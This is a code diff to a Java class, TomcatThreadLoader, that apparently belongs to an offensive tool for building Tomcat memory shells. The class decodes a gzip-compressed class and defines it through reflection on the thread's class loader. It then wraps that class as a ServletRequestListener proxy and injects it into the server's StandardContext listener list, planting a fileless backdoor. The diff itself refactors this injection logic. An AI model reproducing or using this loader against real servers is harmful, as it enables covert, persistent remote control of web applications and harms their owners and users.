@@ -1,5 +1,6 @@
 package com.ppp.middleware.loader;
 
+import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
 
@@ -20,46 +21,35 @@ import java.util.zip.GZIPInputStream;
  */
 @Middleware(Middleware.Tomcat)
 @MemShell(MemShell.Listener)
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
 public class TomcatThreadLoader {
     private static String gzipObject;
-    private static Object[] applicationEventListenersObjects;
-    private static List applicationEventListeners;
-    private static Boolean flag = false;
+    private static String CLASSNAME;
 
     public TomcatThreadLoader() {
     }
 
     static {
         try {
-            Object object = getObject();
-
             // 获取 standardContext
             Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
-            if (!flag && !isInject(standardContext, object)) {
-                inject(standardContext, object);
-            }
+
+            inject(standardContext);
 
         } catch (Throwable e) {
 
         }
     }
 
-//    public static boolean isInject(Object standardContext, Object object) {
-//        return false;
-//    }
-//    public static void inject(Object standardContext, Object object) throws Exception {
-//
-//    }
-
-    /**
-     * Listener
-     */
-    public static boolean isInject(Object standardContext, Object object) {
+    public static void inject(Object standardContext) throws Exception {
+        Object[] applicationEventListenersObjects = null;
+        List applicationEventListeners;
+        Object object = getObject();
         try {
             applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
             for (int i = 0; i < applicationEventListeners.size(); i++) {
                 if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
-                    return true;
+                    return;
                 }
             }
         } catch (Exception e) {
@@ -74,21 +64,18 @@ public class TomcatThreadLoader {
                     Object h = getFieldValue(applicationEventListenersObject, "h");
                     Object h2 = getFieldValue(object, "h");
                     if (h.getClass().getName().contains(h2.getClass().getName())) {
-                        return true;
+                        return;
                     }
                 } else {
                     if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
-                        return true;
+                        return;
                     }
                 }
             }
         } catch (Exception e) {
 
         }
-        return false;
-    }
 
-    public static void inject(Object standardContext, Object object) throws Exception {
         if (applicationEventListenersObjects != null) {
             // 5 6
             Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
@@ -99,7 +86,6 @@ public class TomcatThreadLoader {
             // 7 8 9 10
             invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
         }
-        flag = new Boolean(true);
     }
 
     public static Object getObject() throws Exception {
@@ -116,18 +102,16 @@ public class TomcatThreadLoader {
         }
 
         byte[] bytes = decompress(gzipObject);
-//            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
-//            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-//            defMethod.setAccessible(true);
-//            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
-//            Object object = cls.newInstance();
-
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
         defineClass.setAccessible(true);
-        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+        Class clazz;
+        try {
+            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+        } catch (Exception e) {
+            clazz = classLoader.loadClass(CLASSNAME);
+        }
         Object javaObject = clazz.newInstance();
-
         Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, (InvocationHandler) javaObject);
 
         return object;
